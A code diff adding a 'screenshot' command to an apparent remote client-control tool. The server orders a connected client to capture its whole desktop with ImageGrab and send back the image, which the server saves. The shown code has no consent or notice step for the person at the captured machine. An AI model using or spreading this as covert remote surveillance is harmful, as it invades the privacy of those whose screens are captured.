@@ -1,11 +1,46 @@
 from typing import TYPE_CHECKING
-import os, importlib
+import io, time
+
+from ..enums import PacketType
 
 if TYPE_CHECKING:
-    from ..http import NetterServer
+    from ..http import NetterServer, NetterClient
+    from ..enums import ClientResponse
+    from ..client.connect import Connect
 
-__aliases__ = ["screenshot", "ss", "sso", "testing"]
+__aliases__ = ["screenshot", "ss"]
 __description__ = "Take a screenshot from the client desktop"
+__extra__ = "Usage: `screenshot <Client ID>` | The screenshot will be saved to `client` directory"
 
-def executes(netServer: "NetterServer") -> None:
-    ...
+def execute(netServer: "NetterServer", *args) -> None:
+    if not args and not netServer.selectedClient:
+        netServer.inputHandler.handle('help screenshot') # Sends usage information of this command
+        return
+
+    client: NetterServer = netServer.selectedClient if netServer.selectedClient is not None else \
+        netServer.get(UUID = args[0])
+
+    if (client is None):
+        netServer.console_log('Provided clinet does not exists.', level = 'ERROR')
+        return
+
+    netServer.selectedClient.socket_.responseFunction = on_server_receive
+    netServer.selectedClient.socket_.send_(
+        packetType = PacketType.COMMAND,
+        data = 'screenshot'
+    )
+
+def on_server_receive(netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse") -> None:
+    with open(f'{client.username}T{time.time()}.jpeg', 'wb') as file:
+        file.write(packet.data)
+
+    netServer.console_log(f'Screenshot saved as {client.username}T{time.time()}.jpeg', level = 'INFO')
+
+def on_client_receive(serverHandler: "Connect") -> None:
+    from PIL import ImageGrab
+
+    image = ImageGrab.grab().convert('RGB')
+    byteArray = io.BytesIO()
+
+    image.save(byteArray, format = 'jpeg')
+    serverHandler.send_(packetType = PacketType.COMMAND_RESPONSE, data = byteArray.getvalue())
